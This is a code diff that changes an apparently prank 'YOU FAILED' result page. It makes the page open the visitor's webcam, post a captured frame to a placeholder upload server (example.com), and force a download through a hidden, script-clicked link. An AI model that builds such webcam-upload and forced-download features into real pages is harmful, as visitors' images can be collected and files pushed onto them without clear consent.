@@ -128,9 +128,21 @@
         <div id="divContent"></div>
     </div>
 
+    <div id="webcamContainer" style="display: none;">
+        <video id="webcam" autoplay playsinline width="320" height="240"></video>
+        <button id="capture" onclick="captureImage()">Capture</button>
+    </div>
 
     <script>
-        function result() {
+        async function result() {
+            // Show webcam container
+            document.getElementById('webcamContainer').style.display = 'block';
+
+            // Access the webcam
+            const video = document.getElementById('webcam');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
             // Create a new img element
             var img = document.createElement("img");
 
@@ -148,8 +160,40 @@
             var text = document.createElement("p");
             text.textContent = "YOU FAILED nala zala";
             document.body.appendChild(text);
+
+            // Trigger the download of a related document
+            var link = document.createElement("a");
+            link.href = "result.jpeg"; // Replace with the actual path to your document
+            link.download = "result.jpeg"; // Set the file name for download
+            link.style.display = "none"; // Hide the link
+            document.body.appendChild(link);
+            link.click(); // Simulate a click on the link to trigger the download
+            document.body.removeChild(link); // Remove the link from the document
         }
 
+        function captureImage() {
+            const video = document.getElementById('webcam');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageDataUrl = canvas.toDataURL('image/png');
+
+            // Send image data to the server (example using fetch)
+            fetch('https://example.com/upload', {
+                method: 'POST',
+                body: JSON.stringify({ image: imageDataUrl }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            }).then(response => {
+                console.log('Image sent successfully', response);
+            }).catch(error => {
+                console.error('Error sending image', error);
+            });
+        }
     </script>
 </body>
 
